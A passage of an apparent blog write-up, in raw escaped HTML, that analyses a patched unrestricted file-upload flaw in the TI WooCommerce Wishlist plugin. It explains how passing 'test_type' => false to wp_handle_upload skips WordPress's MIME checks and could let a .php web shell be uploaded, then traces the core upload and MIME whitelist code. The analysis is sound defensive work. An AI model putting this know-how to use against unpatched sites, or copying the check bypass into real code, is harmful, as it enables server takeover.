class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;However, the option &lt;code&gt;test_type =&amp;gt; false&lt;/code&gt; causes WordPress to &lt;strong&gt;skip MIME Type checking&lt;/strong&gt; against its allowed whitelist.&#xA;This allows an attacker to &lt;strong&gt;upload dangerous files such as a &lt;code&gt;.php&lt;/code&gt; web shell&lt;/strong&gt; to the server.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;function tinvwl_upload_file_wc_fields_factory( $file ) {&#xA;&#x9;if ( ! function_exists( &amp;#39;wp_handle_upload&amp;#39; ) ) {&#xA;&#x9;&#x9;require_once( ABSPATH . &amp;#39;wp-admin/includes/file.php&amp;#39; );&#xA;&#x9;}&#xA;&#x9;$upload = wp_handle_upload(&#xA;&#x9;&#x9;$file,&#xA;&#x9;&#x9;[&#xA;&#x9;&#x9;&#x9;&amp;#39;test_form&amp;#39; =&amp;gt; false,&#xA;&#x9;&#x9;]&#xA;&#x9;);&#xA;&#xA;&#x9;return $upload;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch removes the &lt;code&gt;&#39;test_type&#39; =&amp;gt; false&lt;/code&gt; option, so by default &lt;code&gt;&#39;test_type&#39; =&amp;gt; true&lt;/code&gt; is used, enabling MIME checks against the whitelist and preventing uploads of dangerous files like &lt;code&gt;.php&lt;/code&gt; web shells.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;div class=&#34;details admonition question open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Question&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Before tracing further, I want to inspect &lt;code&gt;wp_handle_upload()&lt;/code&gt; to answer two questions:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Why does removing &lt;code&gt;&#39;test_type&#39; =&amp;gt; false&lt;/code&gt; enable MIME whitelist checks?&lt;/li&gt;&#xA;&lt;li&gt;What does that whitelist include?&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_handle_upload/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;wp_handle_upload()&lt;/a&gt; is a wrapper for &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_handle_upload/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;_wp_handle_upload()&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_handle_upload( &amp;amp;$file, $overrides = false, $time = null ) {&#xA;&#x9;/*&#xA;&#x9; *  $_POST[&amp;#39;action&amp;#39;] must be set and its value must equal $overrides[&amp;#39;action&amp;#39;]&#xA;&#x9; *  or this:&#xA;&#x9; */&#xA;&#x9;$action = &amp;#39;wp_handle_upload&amp;#39;;&#xA;&#x9;if ( isset( $overrides[&amp;#39;action&amp;#39;] ) ) {&#xA;&#x9;&#x9;$action = $overrides[&amp;#39;action&amp;#39;];&#xA;&#x9;}&#xA;&#xA;&#x9;return _wp_handle_upload( $file, $overrides, $time, $action );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_handle_upload()&lt;/code&gt; sets &lt;code&gt;$action&lt;/code&gt; and calls &lt;code&gt;_wp_handle_upload()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;In the file containing &lt;code&gt;_wp_handle_upload()&lt;/code&gt;, line &lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-admin/includes/file.php#L915&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;915&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$test_type = isset( $overrides[&amp;#39;test_type&amp;#39;] ) ? $overrides[&amp;#39;test_type&amp;#39;] : true;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 This assigns the value to &lt;code&gt;$test_type&lt;/code&gt; — if &lt;code&gt;$overrides&lt;/code&gt; contains the &lt;code&gt;&#39;test_type&#39;&lt;/code&gt; key, its value is used; otherwise the default is &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;So when we don&amp;rsquo;t pass &lt;code&gt;test_type&lt;/code&gt; or pass &lt;code&gt;test_type =&amp;gt; true&lt;/code&gt;, &lt;code&gt;$test_type&lt;/code&gt; is &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;At lines &lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-admin/includes/file.php#L953-L973&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;953-973&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $test_type ) {&#xA;    $wp_filetype     = wp_check_filetype_and_ext( $file[&amp;#39;tmp_name&amp;#39;], $file[&amp;#39;name&amp;#39;], $mimes );&#xA;    $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;    $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;    $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;&#xA;    // Check to see if wp_check_filetype_and_ext() determined the filename was incorrect.&#xA;    if ( $proper_filename ) {&#xA;        $file[&amp;#39;name&amp;#39;] = $proper_filename;&#xA;    }&#xA;&#xA;    if ( ( ! $type || ! $ext ) &amp;amp;&amp;amp; ! current_user_can( &amp;#39;unfiltered_upload&amp;#39; ) ) {&#xA;        return call_user_func_array( $upload_error_handler, array( &amp;amp;$file, __( &amp;#39;Sorry, you are not allowed to upload this file type.&amp;#39; ) ) );&#xA;    }&#xA;&#xA;    if ( ! $type ) {&#xA;        $type = $file[&amp;#39;type&amp;#39;];&#xA;    }&#xA;} else {&#xA;    $type = &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;code&gt;$test_type = true&lt;/code&gt;, the function calls &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; to validate the file extension and MIME type based on WordPress&amp;rsquo;s allowed whitelist. If the file lacks an allowed extension or MIME type, and the user does not have the &lt;code&gt;unfiltered_upload&lt;/code&gt; capability, the upload is &lt;strong&gt;rejected&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3089-L3315&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Lines 3089-3315&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) {&#xA;&#x9;$proper_filename = false;&#xA;&#xA;&#x9;// Do basic extension validation and MIME mapping.&#xA;&#x9;$wp_filetype = wp_check_filetype( $filename, $mimes );&#xA;    ...&#xA;    // Validate image types.&#xA;    // Validate files that didn&amp;#39;t get validated during previous checks.&#xA;    // The mime type must be allowed.&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; calls &lt;code&gt;wp_check_filetype()&lt;/code&gt; to perform basic extension validation and MIME mapping.&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3045-L3062&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Line 3045-3062&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_check_filetype( $filename, $mimes = null ) {&#xA;&#x9;if ( empty( $mimes ) ) {&#xA;&#x9;&#x9;$mimes = get_allowed_mime_types();&#xA;&#x9;}&#xA;&#x9;$type = false;&#xA;&#x9;$ext  = false;&#xA;&#xA;&#x9;foreach ( $mimes as $ext_preg =&amp;gt; $mime_match ) {&#xA;&#x9;&#x9;$ext_preg = &amp;#39;!\.(&amp;#39; . $ext_preg . &amp;#39;)$!i&amp;#39;;&#xA;&#x9;&#x9;if ( preg_match( $ext_preg, $filename, $ext_matches ) ) {&#xA;&#x9;&#x9;&#x9;$type = $mime_match;&#xA;&#x9;&#x9;&#x9;$ext  = $ext_matches[1];&#xA;&#x9;&#x9;&#x9;break;&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return compact( &amp;#39;ext&amp;#39;, &amp;#39;type&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_check_filetype()&lt;/code&gt; only checks the file extension against WordPress&amp;rsquo;s MIME whitelist — it does not verify the actual file content.&lt;/p&gt;&#xA;&lt;p&gt;The function calls &lt;code&gt;get_allowed_mime_types()&lt;/code&gt; to retrieve the list of allowed MIME types.&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3640-L3661&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Line 3640-3661&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function get_allowed_mime_types( $user = null ) {&#xA;&#x9;$t = wp_get_mime_types();&#xA;&#xA;&#x9;unset( $t[&amp;#39;swf&amp;#39;], $t[&amp;#39;exe&amp;#39;] );&#xA;&#x9;if ( function_exists( &amp;#39;current_user_can&amp;#39; ) ) {&#xA;&#x9;&#x9;$unfiltered = $user ? user_can( $user, &amp;#39;unfiltered_html&amp;#39; ) : current_user_can( &amp;#39;unfiltered_html&amp;#39; );&#xA;&#x9;}&#xA;&#xA;&#x9;if ( empty( $unfiltered ) ) {&#xA;&#x9;&#x9;unset( $t[&amp;#39;htm|html&amp;#39;], $t[&amp;#39;js&amp;#39;] );&#xA;&#x9;}&#xA;&#xA;&#x9;/**&#xA;&#x9; * Filters the list of allowed mime types and file extensions.&#xA;&#x9; *&#xA;&#x9; * @since 2.0.0&#xA;&#x9; *&#xA;&#x9; * @param array            $t    Mime types keyed by the file extension regex corresponding to those types.&#xA;&#x9; * @param int|WP_User|null $user User ID, User object or null if not provided (indicates current user).&#xA;&#x9; */&#xA;&#x9;return apply_filters( &amp;#39;upload_mimes&amp;#39;, $t, $user );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_get_mime_types()&lt;/code&gt; returns the actual list of accepted MIME types.&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/WordPress/wordpress-develop/blob/6.8.3/src/wp-includes/functions.php#L3430-L3557&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Line 3430-3557&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp_get_mime_types() {&#xA;&#x9;/**&#xA;&#x9; * Filters the list of mime types and file extensions.&#xA;&#x9; *&#xA;&#x9; * This filter should be used to add, not remove, mime types. To remove&#xA;&#x9; * mime types, use the &amp;#39;upload_mimes&amp;#39; filter.&#xA;&#x9; *&#xA;&#x9; * @since 3.5.0&#xA;&#x9; *&#xA;&#x9; * @param string[] $wp_get_mime_types Mime types keyed by the file extension regex&#xA;&#x9; *                                    corresponding to those types.&#xA;&#x9; */&#xA;&#x9;return apply_filters(&#xA;&#x9;&#x9;&amp;#39;mime_types&amp;#39;,&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;// Image formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;jpg|jpeg|jpe&amp;#39;                 =&amp;gt; &amp;#39;image/jpeg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;gif&amp;#39;                          =&amp;gt; &amp;#39;image/gif&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;png&amp;#39;                          =&amp;gt; &amp;#39;image/png&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;bmp&amp;#39;                          =&amp;gt; &amp;#39;image/bmp&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;tiff|tif&amp;#39;                     =&amp;gt; &amp;#39;image/tiff&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;webp&amp;#39;                         =&amp;gt; &amp;#39;image/webp&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;avif&amp;#39;                         =&amp;gt; &amp;#39;image/avif&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ico&amp;#39;                          =&amp;gt; &amp;#39;image/x-icon&amp;#39;,&#xA;&#xA;&#x9;&#x9;&#x9;// TODO: Needs improvement. All images with the following mime types seem to have .heic file extension.&#xA;&#x9;&#x9;&#x9;&amp;#39;heic&amp;#39;                         =&amp;gt; &amp;#39;image/heic&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;heif&amp;#39;                         =&amp;gt; &amp;#39;image/heif&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;heics&amp;#39;                        =&amp;gt; &amp;#39;image/heic-sequence&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;heifs&amp;#39;                        =&amp;gt; &amp;#39;image/heif-sequence&amp;#39;,&#xA;&#xA;&#x9;&#x9;&#x9;// Video formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;asf|asx&amp;#39;                      =&amp;gt; &amp;#39;video/x-ms-asf&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wmv&amp;#39;                          =&amp;gt; &amp;#39;video/x-ms-wmv&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wmx&amp;#39;                          =&amp;gt; &amp;#39;video/x-ms-wmx&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wm&amp;#39;                           =&amp;gt; &amp;#39;video/x-ms-wm&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;avi&amp;#39;                          =&amp;gt; &amp;#39;video/avi&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;divx&amp;#39;                         =&amp;gt; &amp;#39;video/divx&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;flv&amp;#39;                          =&amp;gt; &amp;#39;video/x-flv&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mov|qt&amp;#39;                       =&amp;gt; &amp;#39;video/quicktime&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mpeg|mpg|mpe&amp;#39;                 =&amp;gt; &amp;#39;video/mpeg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mp4|m4v&amp;#39;                      =&amp;gt; &amp;#39;video/mp4&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ogv&amp;#39;                          =&amp;gt; &amp;#39;video/ogg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;webm&amp;#39;                         =&amp;gt; &amp;#39;video/webm&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mkv&amp;#39;                          =&amp;gt; &amp;#39;video/x-matroska&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;3gp|3gpp&amp;#39;                     =&amp;gt; &amp;#39;video/3gpp&amp;#39;,  // Can also be audio.&#xA;&#x9;&#x9;&#x9;&amp;#39;3g2|3gp2&amp;#39;                     =&amp;gt; &amp;#39;video/3gpp2&amp;#39;, // Can also be audio.&#xA;&#x9;&#x9;&#x9;// Text formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;txt|asc|c|cc|h|srt&amp;#39;           =&amp;gt; &amp;#39;text/plain&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;csv&amp;#39;                          =&amp;gt; &amp;#39;text/csv&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;tsv&amp;#39;                          =&amp;gt; &amp;#39;text/tab-separated-values&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ics&amp;#39;                          =&amp;gt; &amp;#39;text/calendar&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;rtx&amp;#39;                         =&amp;gt; &amp;#39;text/richtext&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;css&amp;#39;                          =&amp;gt; &amp;#39;text/css&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;htm|html&amp;#39;                     =&amp;gt; &amp;#39;text/html&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;vtt&amp;#39;                          =&amp;gt; &amp;#39;text/vtt&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;dfxp&amp;#39;                         =&amp;gt; &amp;#39;application/ttaf&amp;#43;xml&amp;#39;,&#xA;&#x9;&#x9;&#x9;// Audio formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;mp3|m4a|m4b&amp;#39;                  =&amp;gt; &amp;#39;audio/mpeg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;aac&amp;#39;                          =&amp;gt; &amp;#39;audio/aac&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ra|ram&amp;#39;                       =&amp;gt; &amp;#39;audio/x-realaudio&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wav|x-wav&amp;#39;                    =&amp;gt; &amp;#39;audio/wav&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ogg|oga&amp;#39;                      =&amp;gt; &amp;#39;audio/ogg&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;flac&amp;#39;                         =&amp;gt; &amp;#39;audio/flac&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mid|midi&amp;#39;                     =&amp;gt; &amp;#39;audio/midi&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wma&amp;#39;                          =&amp;gt; &amp;#39;audio/x-ms-wma&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wax&amp;#39;                          =&amp;gt; &amp;#39;audio/x-ms-wax&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mka&amp;#39;                          =&amp;gt; &amp;#39;audio/x-matroska&amp;#39;,&#xA;&#x9;&#x9;&#x9;// Misc application formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;rtf&amp;#39;                          =&amp;gt; &amp;#39;application/rtf&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;js&amp;#39;                           =&amp;gt; &amp;#39;application/javascript&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pdf&amp;#39;                          =&amp;gt; &amp;#39;application/pdf&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;swf&amp;#39;                          =&amp;gt; &amp;#39;application/x-shockwave-flash&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;class&amp;#39;                        =&amp;gt; &amp;#39;application/java&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;tar&amp;#39;                          =&amp;gt; &amp;#39;application/x-tar&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;zip&amp;#39;                          =&amp;gt; &amp;#39;application/zip&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;gz|gzip&amp;#39;                      =&amp;gt; &amp;#39;application/x-gzip&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;rar&amp;#39;                          =&amp;gt; &amp;#39;application/rar&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;7z&amp;#39;                           =&amp;gt; &amp;#39;application/x-7z-compressed&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;exe&amp;#39;                          =&amp;gt; &amp;#39;application/x-msdownload&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;psd&amp;#39;                          =&amp;gt; &amp;#39;application/octet-stream&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xcf&amp;#39;                          =&amp;gt; &amp;#39;application/octet-stream&amp;#39;,&#xA;&#x9;&#x9;&#x9;// MS Office formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;doc&amp;#39;                          =&amp;gt; &amp;#39;application/msword&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pot|pps|ppt&amp;#39;                  =&amp;gt; &amp;#39;application/vnd.ms-powerpoint&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;wri&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-write&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xla|xls|xlt|xlw&amp;#39;              =&amp;gt; &amp;#39;application/vnd.ms-excel&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mdb&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-access&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;mpp&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-project&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;docx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;docm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-word.document.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;dotx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.wordprocessingml.template&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;dotm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-word.template.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlsx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlsm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.sheet.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlsb&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.sheet.binary.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xltx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.spreadsheetml.template&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xltm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.template.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xlam&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-excel.addin.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pptx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.presentation&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pptm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.presentation.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ppsx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.slideshow&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ppsm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.slideshow.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;potx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.template&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;potm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.template.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ppam&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.addin.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;sldx&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.openxmlformats-officedocument.presentationml.slide&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;sldm&amp;#39;                         =&amp;gt; &amp;#39;application/vnd.ms-powerpoint.slide.macroEnabled.12&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;onetoc|onetoc2|onetmp|onepkg&amp;#39; =&amp;gt; &amp;#39;application/onenote&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;oxps&amp;#39;                         =&amp;gt; &amp;#39;application/oxps&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;xps&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.ms-xpsdocument&amp;#39;,&#xA;&#x9;&#x9;&#x9;// OpenOffice formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;odt&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.text&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odp&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.presentation&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ods&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.spreadsheet&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odg&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.graphics&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odc&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.chart&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odb&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.database&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odf&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.formula&amp;#39;,&#xA;&#x9;&#x9;&#x9;// WordPerfect formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;wp|wpd&amp;#39;                       =&amp;gt; &amp;#39;application/wordperfect&amp;#39;,&#xA;&#x9;&#x9;&#x9;// iWork formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;key&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.apple.keynote&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;numbers&amp;#39;                      =&amp;gt; &amp;#39;application/vnd.apple.numbers&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pages&amp;#39;                        =&amp;gt; &amp;#39;application/vnd.apple.pages&amp;#39;,&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 The answer to question two has been found.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;The function &lt;code&gt;tinvwl_upload_file_wc_fields_factory()&lt;/code&gt; is called inside &lt;code&gt;tinvwl_meta_wc_fields_factory()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function tinvwl_meta_wc_fields_factory( $meta, $post, $files ) {&#xA;&#x9;if ( function_exists( &amp;#39;wcff&amp;#39; ) ) {&#xA;&#x9;&#x9;foreach ( $files as $name =&amp;gt; $file ) {&#xA;&#x9;&#x9;&#x9;if ( array_key_exists( $name, $meta ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$upload = tinvwl_upload_file_wc_fields_factory( $file );&#xA;&#x9;&#x9;&#x9;&#x9;if ( empty( $upload[&amp;#39;error&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $upload[&amp;#39;file&amp;#39;] ) ) 